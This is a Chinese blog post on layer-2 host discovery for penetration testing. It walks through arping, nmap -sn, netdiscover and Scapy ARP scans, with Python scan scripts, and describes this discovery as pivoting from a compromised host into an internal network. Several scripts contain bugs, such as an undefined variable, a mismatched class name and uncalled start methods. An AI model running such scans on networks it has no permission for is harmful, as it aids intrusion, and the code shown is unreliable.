<li><figure class="highlight plain"><figcaption><span>arping 192.168.0.1 -c 1```  -c是指定发送一个包以后看是否存在，否则会一直发包；如果不在一个网络里，发包的话是不存在的</span></figcaption><table><tr><td class="code"><pre><span class="line">   - ```sudo arping 192.168.0.1 -d``` -d是同一个ip拥有不同的Mac地址，就是说，如果结果显示有两个Mac地址声称自己是网关，那么你的网络就存在arp欺骗，然后根据路由器查arp表进行定位</span><br><span class="line">   - ```sudo arping 192.168.0.1 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 |cut -d &quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1``` 通过管道显示活着的主机</span><br><span class="line">   - 但是这样只能扫描一个ip，不能自动化的去扫描一个网段，所以用脚本去实现：扫描的时候可以指定网卡，这里用bash脚本来实现这个功能```sudo ./arping1.sh eth0 &gt; addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/12275742.jpg)</span><br><span class="line">   - 第二个脚本：这个脚本的功能是去探测已知ip列表的主机是否存活的脚本，前提是要有一个ip列表的文件```sudo ./arping2.sh addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/77751631.jpg)</span><br><span class="line">   - 如果要在扫描的时候直接将结果重定向到一个文本文件中，直接早bash脚本中添加即可</span><br><span class="line"></span><br><span class="line">2. 二层发现——nmap:</span><br><span class="line"></span><br><span class="line">   - ```nmap -sn 192.168.0.1/24```   扫描速度更快，显示的信息更多</span><br><span class="line"></span><br><span class="line">   - &gt; Nmap scan report for 192.168.0.1</span><br><span class="line">     &gt; Host is up (0.020s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.101</span><br><span class="line">     &gt; Host is up (0.0011s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.104</span><br><span class="line">     &gt; Host is up (0.084s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.107</span><br><span class="line">     &gt; Host is up (0.00059s latency).</span><br><span class="line">     &gt; Nmap done: 256 IP addresses (4 hosts up) scanned in 5.65 seconds</span><br><span class="line"></span><br><span class="line">   - ```nmap -iL filename -sn``` 这个可以做和arping第二个脚本一样的工作</span><br><span class="line"></span><br><span class="line">     &gt; -sn 参数不做端口扫描，但它不仅仅发ARP记录，还会DNS做ptr反向域名解析的解析</span><br><span class="line"></span><br><span class="line">3. 二层发现———Netdiscover</span><br><span class="line"></span><br><span class="line">   - 专用与二层发现</span><br><span class="line">   - 可用于无线和交换网络环境</span><br><span class="line">   - 主动和被动扫描</span><br><span class="line">   - 主动</span><br><span class="line">     - netdiscover -i eth0 -r 192.168.0.1/24![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/71668956.jpg)</span><br><span class="line">     - netdiscover -l iplist.txt</span><br><span class="line">   - 被动</span><br><span class="line">     - netdiscover -p （开启混杂模式）只要在在网卡上有arp包数据，就可以侦听到：![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/18073354.jpg)</span><br><span class="line">     - 主动arp容易触发预警</span><br><span class="line"></span><br><span class="line">4. 二层发现———Scapy</span><br><span class="line"></span><br><span class="line">   - scapy</span><br><span class="line"></span><br><span class="line">     - 作为Python的库文件进行调用</span><br><span class="line">     - 也可以做单独的工具使用</span><br><span class="line">     - 抓包，分析，创建，修改，注入网络流量</span><br><span class="line"></span><br><span class="line">   - apt-get install python-gnuplot</span><br><span class="line"></span><br><span class="line">   - 输入scapy启动scapy启动，然后输入ARP()调用这个函数，```ARP().display()查询ARP函数的属性``` ，这样就可以定制（arp的报头结构，将函数的属性字段添加进去，这样就可以实现一个arp查询）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/83165222.jpg)</span><br><span class="line"></span><br><span class="line">   - 直接利用scapy进行arp探测，实际上就是通过调用scapy自带的函数进行查询：</span><br><span class="line"></span><br><span class="line">     - 首先```sudo scapy``` 启动进行scapy命令行模式下</span><br><span class="line">     - 通过```ARP().display()``` 可以查看APR这个函数下的函数头，然后这只pdst这个要查询的目标```arp.pdst=&quot;192.168.0.1&quot;``` 这里的arp是设置的变量</span><br><span class="line">     - 通过```sr1(arp)``` 进行发包然后查看回显：这里也可以设置一个anwser变量带代替返回的数据包，然后调用display方法查看数据包的返回情况（有一个问题，如果查询的是一个不存在的ip，这样会一直发包，所以要加上timeout，加上一个verbose=1，显示详细的信息）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/81052649.jpg)</span><br><span class="line">     - scapy是Python的库，所以也支持Python脚本来进行探测，可以调用这个库来写脚本进行arp扫描，前面用的是shell脚本```sudo ./arp_disc.py eth0```  用脚本的话要慢，首先这里设计的脚本不是多线程，其次还要判断超时的时间，当然为了准确性，scarp默认发两个数据包</span><br><span class="line"></span><br><span class="line">     &gt; ```python</span><br><span class="line">     &gt; #!/usr/bin/python</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; import logging</span><br><span class="line">     &gt; import subprocess</span><br><span class="line">     &gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">     &gt; from scapy.all import *</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; if len(sys.argv) != 2:</span><br><span class="line">     &gt;     print &quot;Usage - ./arp_disc.py [interface]&quot;</span><br><span class="line">     &gt;     print &quot;Example - ./ar_disc.py eth0&quot;</span><br><span class="line">     &gt;     print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">     &gt;     sys.exit()</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; interface = str(sys.argv[1])</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; ip = subprocess.check_output(&quot;ifconfig&quot; + interface + &quot; | grep &apos;inet&apos; | cut -d&apos;.&apos; -f 1-3 | cut -d&quot; &quot; -f 10 | cut -d &apos;f&apos; -f 1 &quot;,shell = True).strip()</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; prefix = ip.split(&apos;.&apos;)[0] + &apos;.&apos; + ip.split(&apos;.&apos;)[1] + &apos;.&apos; +ip.split(&apos;.&apos;)[2] + &apos;.&apos;</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; for addr in range(1,254):</span><br><span class="line">     &gt;     answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 1,verbose = 0)</span><br><span class="line">     &gt;     if answer == None:</span><br><span class="line">     &gt;         pass</span><br><span class="line">     &gt;     else:</span><br><span class="line">     &gt;         print prefix + str(addr)</span><br><span class="line">     &gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第二个脚本，这个脚本和arping的第二个脚本类似，都是可以调用已知的ip列表文件进行二层的发现：<figure class="highlight plain"><figcaption><span>./arp_disc.py ip_list.txt```  脚本代码如下：</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt; ```python</span><br><span class="line">&gt; #!/usr/bin/python</span><br><span class="line">&gt; #-*- coding:utf-8 -*-</span><br><span class="line">&gt; </span><br><span class="line">&gt; import logging</span><br><span class="line">&gt; import subprocess</span><br><span class="line">&gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">&gt; from scapy.all import *</span><br><span class="line">&gt; </span><br><span class="line">&gt; if len(sys.argv) != 2:</span><br><span class="line">&gt; print &quot;Usage - ./arp_disc.py [filename]&quot;</span><br><span class="line">&gt; print &quot;Example - ./arp_disc.py ip_list.txt&quot;</span><br><span class="line">&gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">&gt; sys.exit()</span><br><span class="line">&gt; </span><br><span class="line">&gt; filename = str(sys.argv[1])</span><br><span class="line">&gt; file = open(filename,&apos;r&apos;)    #打开文件列表</span><br><span class="line">&gt; </span><br><span class="line">&gt; for addr in file:</span><br><span class="line">&gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 0.1,verbose = 0) #verbose=0，不显示报错的具体信息</span><br><span class="line">&gt; if answer == None:</span><br><span class="line">&gt;     pass</span><br><span class="line">&gt; else:</span><br><span class="line">&gt;     print addr.strip()    #将报错信息打印出来</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
</blockquote>
</li>
</ul>
</li>
</ol>
<blockquote>
<p><strong>总结：二层的发现主要是在拿下一台主机以后以此机器作为跳板进而对整个内网进行发现，但是由于内网的网络环境未知，而且服务器上面不一定有nmap，所以我们要利用一切可以利用的工具：arping，nmap,netdiscover,scopy等工具，以及自己编写的脚本</strong></p>
</blockquote>
<p><em>针对上面的两个脚本再补充两个多线程的脚本，就当做py练手了</em></p>
<ol>
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt;</span><br><span class="line">&gt; ip = subprocess.check_output(</span><br><span class="line">&gt;     <span class="string">"ifconfig "</span> + interface + <span class="string">" | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 "</span>,</span><br><span class="line">&gt;     shell = <span class="keyword">True</span>).strip()</span><br><span class="line">&gt; prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> answer,lock,n</span><br><span class="line">&gt;         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             answer = sr1(ARP(pdst = prefix + str(n)),timeout = <span class="number">1</span>,verbose = <span class="number">0</span>)</span><br><span class="line">&gt;             <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                 <span class="keyword">pass</span></span><br><span class="line">&gt;             <span class="keyword">else</span>:</span><br><span class="line">&gt;                 <span class="keyword">print</span> prefix + str(n)</span><br><span class="line">&gt;             n += <span class="number">1</span></span><br><span class="line">&gt;             lock.release()</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     n = <span class="number">1</span></span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start()</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt;</span><br><span class="line">&gt; ip = subprocess.check_output(</span><br><span class="line">&gt;     <span class="string">"ifconfig "</span> + interface + <span class="string">" | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 "</span>,</span><br><span class="line">&gt;     shell = <span class="keyword">True</span>).strip()</span><br><span class="line">&gt; prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> answer,lock</span><br><span class="line">&gt;         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">&gt;                 answer = sr1(ARP(pdst = prefix + str(addr)),timeout = <span class="number">1</span>,verbose = <span class="number">0</span>)</span><br><span class="line">&gt;                 <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                     <span class="keyword">pass</span></span><br><span class="line">&gt;                 <span class="keyword">else</span>:</span><br><span class="line">&gt;                     <span class="keyword">print</span> prefix + str(addr)</span><br><span class="line">&gt;             lock.release()</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start()</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<ol start="2">
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [filename]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py ip_list.txt"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; filename = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt; file = open(filename,<span class="string">'r'</span>)  <span class="comment"># 打开文件列表</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">Mythread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> lock</span><br><span class="line">&gt;         time.sleep(<span class="number">1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             <span class="keyword">for</span> addr <span class="keyword">in</span> file:</span><br><span class="line">&gt;                 answer = sr1(ARP(pdst = addr.strip()),timeout = <span class="number">0.1</span>,</span><br><span class="line">&gt;                              verbose = <span class="number">0</span>)  <span class="comment"># verbose=0，不显示报错的具体信息,这里循环打开的是文件中的每一行IP地址</span></span><br><span class="line">&gt;                 <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                     <span class="keyword">pass</span></span><br><span class="line">&gt;                 <span class="keyword">else</span>:</span><br><span class="line">&gt;                     <span class="keyword">print</span> addr.strip()  <span class="comment"># 将报错信息打印出来</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
